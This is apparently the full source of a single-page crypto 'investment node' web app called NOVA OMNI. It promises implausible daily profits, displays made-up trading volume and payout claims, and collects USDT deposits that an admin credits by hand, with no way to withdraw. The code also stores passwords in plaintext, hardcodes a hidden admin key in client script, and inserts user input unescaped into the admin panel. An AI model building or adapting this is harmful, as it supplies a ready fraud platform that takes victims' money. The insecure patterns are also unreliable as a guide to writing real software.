<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA OMNI | Global Institutional Terminal</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --bg: #010409; --card: #0d1117; --accent: #00ff88; --text: #f0f6fc; --dim: #8b949e; --gold: #f2cc60; --danger: #ff4d4d; }
        body { margin: 0; font-family: 'Plus Jakarta Sans', sans-serif; background: var(--bg); color: var(--text); overflow-x: hidden; padding-bottom: 100px; }
        
        /* Modern Glass UI */
        .glass { background: var(--card); border: 1px solid rgba(255,255,255,0.05); border-radius: 35px; padding: 25px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        input { width: 100%; padding: 18px; background: #161b22; border: 1px solid #30363d; color: #fff; border-radius: 20px; margin-bottom: 12px; outline: none; transition: 0.3s; }
        input:focus { border-color: var(--accent); }
        .btn-prime { width: 100%; padding: 18px; background: var(--accent); color: #000; border: none; border-radius: 20px; font-weight: 800; cursor: pointer; text-transform: uppercase; }

        /* Nodes Styling */
        .node-card { background: var(--card); border-radius: 30px; padding: 15px; border: 1px solid #30363d; position: relative; overflow: hidden; }
        .node-img { width: 100%; height: 120px; border-radius: 20px; object-fit: cover; margin-bottom: 10px; background: #161b22; }
        .timer-badge { position: absolute; top: 10px; right: 10px; background: rgba(0,0,0,0.7); color: var(--gold); padding: 4px 10px; border-radius: 50px; font-size: 10px; font-weight: 800; border: 1px solid var(--gold); }
        .profit-line { display: flex; justify-content: space-between; font-size: 11px; margin-top: 8px; color: var(--dim); }

        /* Animation */
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
        .live-dot { height: 8px; width: 8px; background: var(--accent); border-radius: 50%; display: inline-block; animation: pulse 2s infinite; }

        /* Navigation */
        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: rgba(13, 17, 23, 0.95); display: flex; justify-content: space-around; padding: 18px 0; border-top: 1px solid #30363d; z-index: 1000; backdrop-filter: blur(10px); }
        .nav-item { color: var(--dim); font-size: 10px; text-align: center; font-weight: 800; }
        .nav-item.active { color: var(--accent); }
        .screen { display: none; }
        .active-screen { display: block; }
    </style>
</head>
<body>

    <div style="background:#161b22; color:var(--accent); padding:10px; font-size:10px; font-weight:800; white-space:nowrap; overflow:hidden;">
        <div style="display:inline-block; animation: drift 30s linear infinite;"> 🚀 NOVA OMNI: SYSTEM SECURED • 24H VOLUME: $2.4M • NEW NODES V.21 DEPLOYED • WORLDWIDE PAYOUTS ARE LIVE • 🚀 </div>
    </div>

    <div id="auth-screen" style="min-height:90vh; display:flex; flex-direction:column; align-items:center; justify-content:center; padding:20px;">
        <div style="text-align:center; margin-bottom:30px;">
            <h1 id="tap-logo" onclick="handleTaps()" style="font-size:4rem; margin:0; letter-spacing:-4px;">NOVA<span style="color:var(--accent)">.</span></h1>
            <p style="color:var(--dim); font-size:10px; letter-spacing:4px;">INSTITUTIONAL ACCESS</p>
        </div>
        <div class="glass" style="width:100%; max-width:400px;">
            <div id="auth-box">
                <input type="text" id="u-id" placeholder="User Identity">
                <input type="password" id="u-pass" placeholder="Master Passkey">
                <input type="text" id="secret-admin" style="display:none; border:1px solid var(--gold);" placeholder="Admin Master Key">
                <button class="btn-prime" onclick="processAuth()">Enter Protocol</button>
                <p style="text-align:center; font-size:12px; color:var(--dim); margin-top:15px;">New Identity? <span style="color:var(--accent)" onclick="alert('Just enter new ID/Pass to Register!')">Create Here</span></p>
            </div>
        </div>
    </div>

    <div id="admin-panel" style="display:none; position:fixed; inset:0; background:#000; z-index:9999; padding:20px; overflow-y:auto;">
        <h2 style="color:var(--gold);"><i class="fa-solid fa-crown"></i> ADMIN CONTROL</h2>
        <button onclick="location.reload()" style="background:var(--danger); border:none; padding:10px; color:white; border-radius:10px;">EXIT</button>
        <div id="admin-tx-list" style="margin-top:20px;"></div>
    </div>

    <div id="app-main" style="display:none;">
        <header style="padding:20px; display:flex; justify-content:space-between; align-items:center;">
            <div style="display:flex; align-items:center; gap:10px;">
                <div style="background:var(--accent); width:35px; height:35px; border-radius:10px; color:#000; display:flex; align-items:center; justify-content:center; font-weight:900;">N</div>
                <div style="font-size:12px;"><span id="disp-u">...</span><br><small style="color:var(--accent); font-weight:900;">ELITE ACCOUNT</small></div>
            </div>
            <i class="fa-solid fa-headset" onclick="nav('support')" style="color:var(--dim);"></i>
        </header>

        <div id="home" class="screen active-screen">
            <div style="background: linear-gradient(135deg, #00ff88, #008f4c); border-radius:40px; padding:30px; margin:15px; color:#000;">
                <p style="font-weight:900; opacity:0.8; margin:0;">TOTAL CAPITAL ASSETS</p>
                <h1 id="mainBal" style="font-size:3.5rem; margin:10px 0; letter-spacing:-3px;">$0.00</h1>
                <div style="background:rgba(0,0,0,0.1); height:8px; border-radius:10px; overflow:hidden;">
                    <div id="p-bar" style="height:100%; width:0%; background:#fff; transition:0.1s linear;"></div>
                </div>
                <div style="display:flex; justify-content:space-between; margin-top:15px; font-size:11px; font-weight:900;">
                    <span>DAILY PROFIT: <b id="d-prof">+$0.00</b></span>
                    <span>TOTAL PROFIT: <b id="t-prof">$0.00</b></span>
                </div>
            </div>

            <div id="nodes-container" style="display:grid; grid-template-columns:1fr 1fr; gap:15px; padding:15px;">
                </div>
        </div>

        <div id="vault" class="screen">
            <div class="glass" style="margin:15px;">
                <h3>DEPOSIT ASSETS</h3>
                <p style="font-size:10px; color:var(--accent);">USDT(TRC20): 0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2</p>
                <input type="number" id="depAmt" placeholder="Amount ($)">
                <input type="text" id="tid" placeholder="Transaction Hash">
                <button class="btn-prime" onclick="submitDeposit()">Submit Deposit</button>
            </div>
        </div>

        <div id="support" class="screen">
            <div class="glass" style="margin:15px; text-align:center;">
                <i class="fa-solid fa-circle-question" style="font-size:3rem; color:var(--accent);"></i>
                <h2>Support Portal</h2>
                <button class="btn-prime" style="background:#0088cc; color:#fff; margin-top:20px;" onclick="window.open('https://t.me/your_telegram')">Telegram Live</button>
            </div>
        </div>
    </div>

    <nav class="bottom-nav" id="nav-bar" style="display:none;">
        <div class="nav-item active" onclick="nav('home', this)"><i class="fa-solid fa-chart-pie" style="font-size:1.3rem;"></i><br>DASHBOARD</div>
        <div class="nav-item" onclick="nav('vault', this)"><i class="fa-solid fa-vault" style="font-size:1.3rem;"></i><br>VAULT</div>
        <div class="nav-item" onclick="nav('support', this)"><i class="fa-solid fa-headset" style="font-size:1.3rem;"></i><br>SUPPORT</div>
    </nav>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        const firebaseConfig = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        let user = null; let taps = 0;

        // Base64 Placeholder (Yahan aap apni real Base64 image strings daal sakti hain)
        const nodeImg = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJb9qxAAAAA1BMVEWAgICQpREbAAAAR0lEQVR4nO3BAQEAAACAkP6v7ggKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgB8M4AAHL750VAAAAAElFTkSuQmCC";

        window.handleTaps = () => {
            taps++; if(taps >= 5) { document.getElementById('secret-admin').style.display='block'; document.getElementById('tap-logo').style.color='var(--gold)'; }
        };

        window.processAuth = async () => {
            const u = document.getElementById('u-id').value.toLowerCase().trim();
            const p = document.getElementById('u-pass').value;
            const sk = document.getElementById('secret-admin').value;

            if(sk === "nov786") { document.getElementById('admin-panel').style.display='block'; loadAdmin(); return; }
            if(!u || !p) return alert("Fill all fields");

            const ref = doc(db, "users", u);
            const snap = await getDoc(ref);
            if(snap.exists()) {
                if(snap.data().password === p) { loginSuccess(u); }
                else alert("Wrong Passkey");
            } else {
                await setDoc(ref, { password: p, balance: 0, daily: 0, total: 0 });
                loginSuccess(u);
            }
        };

        function loginSuccess(u) {
            sessionStorage.setItem("nova_u", u);
            user = u;
            document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('app-main').style.display = 'block';
            document.getElementById('nav-bar').style.display = 'flex';
            document.getElementById('disp-u').innerText = u.toUpperCase();
            
            onSnapshot(doc(db, "users", u), (d) => {
                const data = d.data();
                document.getElementById('mainBal').innerText = "$" + data.balance.toLocaleString();
                document.getElementById('d-prof').innerText = "+$" + (data.daily || 0);
                document.getElementById('t-prof').innerText = "$" + (data.total || 0);
            });
            renderNodes();
            startBar();
        }

        function renderNodes() {
            const container = document.getElementById('nodes-container');
            container.innerHTML = "";
            const nodes = [
                {p:30, d:1.2}, {p:50, d:2.5}, {p:100, d:5}, {p:200, d:10}, {p:500, d:25},
                {p:800, d:45}, {p:1000, d:60}, {p:1500, d:90}, {p:2000, d:130}, {p:3000, d:210},
                {p:5000, d:400}, {p:7000, d:580}, {p:10000, d:900}, {p:12000, d:1100}, {p:15000, d:1450},
                {p:18000, d:1800}, {p:20000, d:2100}, {p:25000, d:2700}, {p:30000, d:3500}, {p:50000, d:6000}
            ];

            nodes.forEach((n, i) => {
                container.innerHTML += `
                    <div class="node-card">
                        <div class="timer-badge">30d 00h 00m</div>
                        <img src="${nodeImg}" class="node-img">
                        <div style="font-weight:900; font-size:13px;">NODE SERIES V.${i+1}</div>
                        <div style="font-size:18px; font-weight:800; color:var(--accent);">$${n.p.toLocaleString()}</div>
                        <div class="profit-line"><span>Daily:</span> <b>$${n.d}</b></div>
                        <div class="profit-line"><span>Term:</span> <b>30 Days</b></div>
                        <button class="btn-prime" style="padding:10px; font-size:10px; margin-top:10px;">Activate Node</button>
                    </div>`;
            });
        }

        window.submitDeposit = async () => {
            const amt = document.getElementById('depAmt').value;
            const t = document.getElementById('tid').value;
            if(!amt || !t) return alert("Missing Info");
            await addDoc(collection(db, "pending_tx"), { user, amount: parseFloat(amt), tid: t, status: "Pending", time: Date.now() });
            alert("Sent to Admin!");
        };

        function loadAdmin() {
            onSnapshot(collection(db, "pending_tx"), (snap) => {
                const list = document.getElementById('admin-tx-list'); list.innerHTML = "";
                snap.forEach(d => {
                    const tx = d.data(); if(tx.status === "Pending") {
                        list.innerHTML += `<div class="glass" style="margin-bottom:10px; border-left:4px solid var(--accent);">
                            <p>${tx.user} | $${tx.amount} | ID: ${tx.tid}</p>
                            <button onclick="approveDep('${d.id}','${tx.user}',${tx.amount})" style="background:var(--accent); border:none; padding:10px; width:100%; border-radius:10px; font-weight:800;">APPROVE</button>
                        </div>`;
                    }
                });
            });
        }

        window.approveDep = async (id, u, amt) => {
            const ref = doc(db, "users", u); const s = await getDoc(ref);
            await updateDoc(ref, { balance: (s.data().balance || 0) + amt });
            await updateDoc(doc(db, "pending_tx", id), { status: "Approved" });
            alert("Done!");
        };

        window.nav = (id, el) => {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen'));
            document.getElementById(id).classList.add('active-screen');
            if(el) {
                document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
                el.classList.add('active');
            }
        };

        function startBar() { let p=0; setInterval(() => { p=(p+0.5)%100; document.getElementById('p-bar').style.width=p+"%"; }, 100); }
        if(sessionStorage.getItem("nova_u")) loginSuccess(sessionStorage.getItem("nova_u"));
    </script>
</body>
</html>
